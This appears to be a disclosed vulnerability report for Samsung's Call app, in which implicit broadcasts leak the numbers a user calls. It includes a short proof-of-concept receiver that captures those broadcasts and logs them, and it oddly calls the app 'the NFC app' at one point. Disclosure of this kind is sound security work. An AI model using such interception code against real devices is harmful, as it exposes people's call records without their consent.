# Details

<table>
    <tr>
        <td>Name</td>
        <td>Call</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.incallui</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.16</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.02.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$640</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/132.%20Call%20—%20Leakage%20of%20called%20phone%20numbers/Oversecured_report.png)

Oversecured found the NFC app using implicit intents in the `com/android/incallui/viewmodelimpl/executor/card/DisplayRcsCallContentExecutorImpl.java` file to send broadcasts with the `com.samsung.crane.callcomposer.IMPORTANCETOGGLE` action. They contained the called phone number.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.samsung.crane.callcomposer.IMPORTANCETOGGLE" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:
```java
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        DumpUtils.dump(intent, context.getClassLoader());
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
